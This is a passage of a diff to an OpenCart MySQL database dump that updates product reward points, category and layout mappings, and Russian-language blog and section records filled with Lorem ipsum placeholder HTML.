 (1999, 36, 'catalog/demo/ipod_nano_2.jpg', 0),
 (1998, 36, 'catalog/demo/ipod_nano_3.jpg', 0),
 (2003, 34, 'catalog/demo/ipod_shuffle_2.jpg', 0),
@@ -2916,7 +2929,7 @@ CREATE TABLE IF NOT EXISTS `oc_product_reward` (
   `customer_group_id` int(11) NOT NULL DEFAULT '0',
   `points` int(8) NOT NULL DEFAULT '0',
   PRIMARY KEY (`product_reward_id`)
-) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=622 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=624 ;
 
 --
 -- Дамп данных таблицы `oc_product_reward`
@@ -2924,11 +2937,10 @@ CREATE TABLE IF NOT EXISTS `oc_product_reward` (
 
 INSERT INTO `oc_product_reward` (`product_reward_id`, `product_id`, `customer_group_id`, `points`) VALUES
 (603, 42, 1, 100),
-(620, 47, 1, 300),
+(623, 47, 1, 300),
 (546, 28, 1, 400),
 (621, 43, 1, 600),
 (339, 29, 1, 0),
-(343, 48, 1, 0),
 (614, 30, 1, 200),
 (331, 44, 1, 700),
 (333, 45, 1, 800),
@@ -2987,11 +2999,12 @@ CREATE TABLE IF NOT EXISTS `oc_product_to_category` (
 --
 
 INSERT INTO `oc_product_to_category` (`product_id`, `category_id`) VALUES
-(40, 70),
+(40, 72),
 (42, 66),
 (42, 70),
 (43, 70),
-(47, 70);
+(47, 72),
+(48, 70);
 
 -- --------------------------------------------------------
 
@@ -3028,7 +3041,8 @@ INSERT INTO `oc_product_to_layout` (`product_id`, `store_id`, `layout_id`) VALUE
 (42, 0, 0),
 (30, 0, 0),
 (47, 0, 0),
-(40, 0, 0);
+(40, 0, 0),
+(48, 0, 0);
 
 -- --------------------------------------------------------
 
@@ -3133,15 +3147,15 @@ CREATE TABLE IF NOT EXISTS `oc_record` (
 
 INSERT INTO `oc_record` (`record_id`, `blog_main`, `image`, `sort_order`, `status`, `customer_group_id`, `customer_id`, `author`, `comment`, `comment_status`, `comment_status_reg`, `comment_status_now`, `date_available`, `date_end`, `date_added`, `date_modified`, `viewed`) VALUES
 (1, 0, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-02-28 05:01:06', '2033-03-03 00:00:00', '2016-02-28 05:01:29', '2016-03-01 02:00:49', 111),
-(2, 0, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-02-28 10:51:58', '2033-03-03 00:00:00', '2016-02-28 10:53:47', '2016-03-07 14:12:40', 43),
-(3, 0, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-02-28 10:54:47', '2033-03-03 00:00:00', '2016-02-28 10:56:39', '2016-03-07 15:17:23', 40),
-(6, 6, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-02-29 14:13:32', '2033-03-03 00:00:00', '2016-02-29 14:13:56', '2016-03-12 17:34:21', 6),
+(2, 0, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-02-28 10:51:58', '2033-03-03 00:00:00', '2016-02-28 10:53:47', '2016-03-12 22:09:32', 47),
+(3, 0, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-02-28 10:54:47', '2033-03-03 00:00:00', '2016-02-28 10:56:39', '2016-03-12 22:08:49', 132),
+(6, 6, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-02-29 14:13:32', '2033-03-03 00:00:00', '2016-02-29 14:13:56', '2016-03-12 17:34:21', 10),
 (7, 7, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-01 14:19:02', '2033-03-03 00:00:00', '2016-03-01 15:19:47', '0000-00-00 00:00:00', 0),
-(8, 8, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 12:02:51', '2033-03-03 00:00:00', '2016-03-12 16:03:02', '2016-03-12 16:15:08', 7),
-(9, 8, '', 2, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 16:18:28', '2033-03-03 00:00:00', '2016-03-12 16:25:45', '2016-03-12 16:26:02', 17),
-(10, 8, '', 3, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 18:39:21', '2033-03-03 00:00:00', '2016-03-12 18:39:44', '2016-03-12 18:40:03', 0),
+(8, 8, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 12:02:51', '2033-03-03 00:00:00', '2016-03-12 16:03:02', '2016-03-12 19:58:46', 23),
+(9, 8, '', 2, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 16:18:28', '2033-03-03 00:00:00', '2016-03-12 16:25:45', '2016-03-12 16:26:02', 19),
+(10, 8, '', 3, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 18:39:21', '2033-03-03 00:00:00', '2016-03-12 18:39:44', '2016-03-12 18:40:03', 6),
 (11, 9, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 18:44:20', '2033-03-03 00:00:00', '2016-03-12 18:44:59', '0000-00-00 00:00:00', 0),
-(12, 10, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 18:54:16', '2033-03-03 00:00:00', '2016-03-12 18:54:41', '0000-00-00 00:00:00', 0);
+(12, 10, '', 1, 1, 1, 0, '', 'a:8:{s:6:"status";s:1:"1";s:10:"status_reg";s:1:"0";s:10:"status_now";s:1:"0";s:6:"rating";s:1:"0";s:6:"signer";s:1:"1";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:10:"rating_num";s:0:"";}', 0, 0, 0, '2016-03-12 18:54:16', '2033-03-03 00:00:00', '2016-03-12 18:54:41', '2016-03-12 19:50:17', 0);
 
 -- --------------------------------------------------------
 
@@ -3185,16 +3199,15 @@ INSERT INTO `oc_record_description` (`record_id`, `language_id`, `name`, `sdescr
 (7, 1, 'Заказать обратный звонок', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
 (7, 3, 'Заказать обратный звонок', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
 (7, 4, 'Заказать обратный звонок', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
-(3, 3, 'Раздел о системах управления ДГУ', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
 (3, 4, 'Раздел о системах управления ДГУ', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
-(2, 1, 'Раздел о конверсионных электростанциях', '&lt;section class=&quot;white-and-grey-grid product-division&quot;&gt;			&lt;div class=&quot;wide-body-layout&quot;&gt;				&lt;div class=&quot;flex-wrapper&quot;&gt;					&lt;h3 class=&quot;section-title&quot;&gt;Раздел о системе&lt;/h3&gt;&lt;h3 class=&quot;section-title&quot;&gt;&lt;br&gt;&lt;/h3&gt;&lt;/div&gt;&lt;/div&gt;&lt;/section&gt;&lt;img src=&quot;\\catalog\\view\\theme\\service\\image\\product1.jpg&quot; style=&quot;width: 278px;&quot;&gt;&lt;section class=&quot;white-and-grey-grid product-division&quot;&gt;&lt;div class=&quot;wide-body-layout&quot;&gt;&lt;div class=&quot;flex-wrapper&quot;&gt;&lt;h3 class=&quot;section-title&quot;&gt;&lt;br&gt;&lt;/h3&gt;&lt;p class=&quot;section-description&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/p&gt;									&lt;/div&gt;			&lt;/div&gt;		&lt;/section&gt;', '&lt;section class=&quot;white-and-grey-grid product-division&quot;&gt;			&lt;div class=&quot;wide-body-layout&quot;&gt;				&lt;div class=&quot;flex-wrapper&quot;&gt;					&lt;h3 class=&quot;section-title&quot;&gt;Раздел о системе&lt;/h3&gt;					&lt;img src=&quot;\\catalog\\view\\theme\\service\\image\\product1.jpg&quot; alt=&quot;&quot;&gt;					&lt;p class=&quot;section-description&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/p&gt;									&lt;/div&gt;			&lt;/div&gt;		&lt;/section&gt;', 'Раздел о конверсионных электростанциях', 'Раздел о конверсионных электростанциях', 'Раздел о конверсионных электростанциях', 'Раздел о конверсионных электростанциях'),
-(6, 1, 'Новая услуга', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 18.48px; word-spacing: 1px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;', 'Новая услуга', 'Новая услуга', 'Новая услуга', 'Новая услуга'),
-(3, 1, 'Раздел о системах управления ДГУ', '&lt;section class=&quot;white-and-grey-grid product-division&quot;&gt;	&lt;img src=&quot;\\catalog\\view\\theme\\service\\image\\product1.jpg&quot; alt=&quot;&quot; style=&quot;font-size: 14px; line-height: 20px; background-color: transparent;&quot;&gt;&lt;div=&quot;&quot; class=&quot;wide-body-layout&quot;&gt;				&lt;div class=&quot;flex-wrapper&quot;&gt;															&lt;p class=&quot;section-description&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/p&gt;								&lt;/div&gt;					&lt;/div=&quot;&quot;&gt;&lt;/section&gt;', '&lt;section class=&quot;white-and-grey-grid product-division&quot;&gt;			&lt;div class=&quot;wide-body-layout&quot;&gt;				&lt;div class=&quot;flex-wrapper&quot;&gt;					&lt;h3 class=&quot;section-title&quot;&gt;&lt;img src=&quot;\\catalog\\view\\theme\\service\\image\\product1.jpg&quot; alt=&quot;&quot; style=&quot;font-size: 14px; line-height: 20px; background-color: transparent;&quot;&gt;&lt;br&gt;&lt;/h3&gt;&lt;p class=&quot;section-description&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/p&gt;							&lt;/div&gt;		&lt;/div&gt;&lt;/section&gt;', 'Раздел о системах управления ДГУ', 'Раздел о системах управления ДГУ', 'Раздел о системах управления ДГУ', 'Раздел о системах управления ДГУ'),
 (2, 3, 'Раздел о конверсионных электростанциях', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
 (2, 4, 'Раздел о конверсионных электростанциях', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
+(6, 1, 'Новая услуга', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 18.48px; word-spacing: 1px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;', 'Новая услуга', 'Новая услуга', 'Новая услуга', 'Новая услуга'),
+(3, 3, 'Раздел о системах управления ДГУ', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
+(2, 1, 'Раздел о конверсионных электростанциях', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;section class=&quot;white-and-grey-grid product-division&quot;&gt;			&lt;div class=&quot;wide-body-layout&quot;&gt;				&lt;div class=&quot;flex-wrapper&quot;&gt;					&lt;h3 class=&quot;section-title&quot;&gt;&lt;span style=&quot;font-size: 14px; line-height: 20px; background-color: transparent;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;/h3&gt;									&lt;/div&gt;			&lt;/div&gt;		&lt;/section&gt;', 'Раздел о конверсионных электростанциях', 'Раздел о конверсионных электростанциях', 'Раздел о конверсионных электростанциях', 'Раздел о конверсионных электростанциях'),
+(8, 1, 'Блог1', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;h3 class=&quot;section-title&quot; style=&quot;font-family: ''Open Sans'', sans-serif; color: rgb(0, 0, 0);&quot;&gt;&lt;img src=&quot;http://shop/catalog/view/theme/service/image/product1.jpg&quot; alt=&quot;&quot; style=&quot;font-size: 14px; line-height: 20px; background-color: transparent;&quot;&gt;&lt;br&gt;&lt;/h3&gt;&lt;p class=&quot;section-description&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/p&gt;', 'Блог1', 'Блог1', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excep', 'БлогиБлогиБлоги'),
 (8, 3, 'Блог1', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
 (8, 4, 'Блог1', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
-(8, 1, 'Блог1', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;h3 class=&quot;section-title&quot; style=&quot;font-family: ''Open Sans'', sans-serif; color: rgb(0, 0, 0);&quot;&gt;&lt;img src=&quot;http://shop/catalog/view/theme/service/image/product1.jpg&quot; alt=&quot;&quot; style=&quot;font-size: 14px; line-height: 20px; background-color: transparent;&quot;&gt;&lt;br&gt;&lt;/h3&gt;&lt;p class=&quot;section-description&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/p&gt;', 'Блог1', 'Блог1', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excep', 'БлогиБлогиБлоги'),
 (9, 3, 'Блог2', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Блог2', 'Блог2', '', ''),
 (9, 1, 'Блог2', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 22px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;', 'Блог2', 'Блог2', '', ''),
 (9, 4, 'Блог2', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Блог2', 'Блог2', '', ''),
@@ -3206,9 +3219,10 @@ INSERT INTO `oc_record_description` (`record_id`, `language_id`, `name`, `sdescr
 (11, 1, 'Новость 1', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 22px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;', 'Новость 1', 'Новость 1', '', ''),
 (11, 3, 'Новость 1', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
 (11, 4, 'Новость 1', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
-(12, 1, 'Проект 1', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 22px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;', 'Проект 1', 'Проект 1', '', ''),
 (12, 3, 'Проект 1', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
-(12, 4, 'Проект 1', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', '');
+(12, 1, 'Проект 1', 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.', '&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 22px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;', 'Проект 1', 'Проект 1', '', ''),
+(12, 4, 'Проект 1', '', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', '', '', '', ''),
